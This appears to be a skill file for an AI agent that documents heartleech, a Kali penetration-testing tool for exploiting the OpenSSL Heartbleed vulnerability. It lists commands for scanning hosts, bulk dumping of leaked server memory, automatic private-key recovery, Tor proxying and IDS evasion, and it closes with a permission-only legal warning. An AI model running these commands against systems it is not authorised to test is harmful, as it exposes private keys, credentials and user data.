---
name: heartleech
description: Scan for and exploit the OpenSSL Heartbleed vulnerability (CVE-2014-0160). Use to detect vulnerable systems, perform bulk data exfiltration from memory, and automatically retrieve private keys. Applicable during vulnerability analysis and exploitation phases of web application or network penetration testing.
---

# heartleech

## Overview
A specialized tool for detecting and exploiting the OpenSSL Heartbleed vulnerability. It provides conclusive vulnerability verdicts, supports high-speed bulk data downloads for offline analysis, and can automatically reconstruct private keys from leaked memory. Category: Vulnerability Analysis / Web Application Testing.

## Installation (if not already installed)
Assume heartleech is already installed. If the command is missing:

```bash
sudo apt install heartleech
```

## Common Workflows

### Scan a target for vulnerability
```bash
heartleech 192.168.1.50
```
Checks if the target at the default port (443) is vulnerable to Heartbleed.

### Bulk data exfiltration
```bash
heartleech 192.168.1.50 --dump heartbleed_data.bin --threads 10
```
Continuously downloads leaked memory from the target using multiple threads and saves it to a file.

### Scan a list of targets from a file
```bash
heartleech --list targets.txt
```

### Scan via Tor/Socks5 proxy
```bash
heartleech 192.168.1.50 --proxy localhost:9050
```

## Complete Command Reference

```
heartleech <hostname/IP> [options]
```

### General Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Print help message and exit |
| `--list <file>` | Read a list of targets from a file |
| `-p <port>` | Specify the port to connect to (default: 443) |
| `--proxy <host:port>` | Use a SOCKS5n proxy (e.g., Tor) for the connection |
| `--threads <count>` | Number of threads to use for bulk downloading |
| `--timeout <seconds>` | Set connection timeout |
| `-v`, `--verbose` | Increase verbosity for diagnostic information |

### Exploitation & Data Options

| Flag | Description |
|------|-------------|
| `--dump <file>` | Download heartbleed data into a large file for offline processing |
| `--key` | Automatically attempt to retrieve the server's private key |
| `--loop` | Continuously loop the request to gather more data |

### Protocol & Evasion Options

| Flag | Description |
|------|-------------|
| `--starttls` | Use STARTTLS for protocols like SMTP, POP3, or IMAP |
| `--ipv6` | Force the use of IPv6 |
| `--ids` | Apply limited IDS evasion techniques during the heartbeat request |
| `--payload <size>` | Specify a custom payload size for the heartbeat request |

## Notes
- **Conclusive Verdicts**: Unlike some scanners, heartleech attempts to verify the vulnerability by actually receiving a heartbeat response.
- **Private Key Recovery**: The tool can identify RSA private key primes within the leaked memory to reconstruct the server's key.
- **Windows Version**: A Windows executable is typically located at `/usr/share/windows-resources/heartleech/heartleech.exe` on Kali Linux systems.
- **Legal Warning**: Only use this tool on systems you have explicit permission to test. Heartbleed exploitation involves reading sensitive memory which may contain credentials or private data.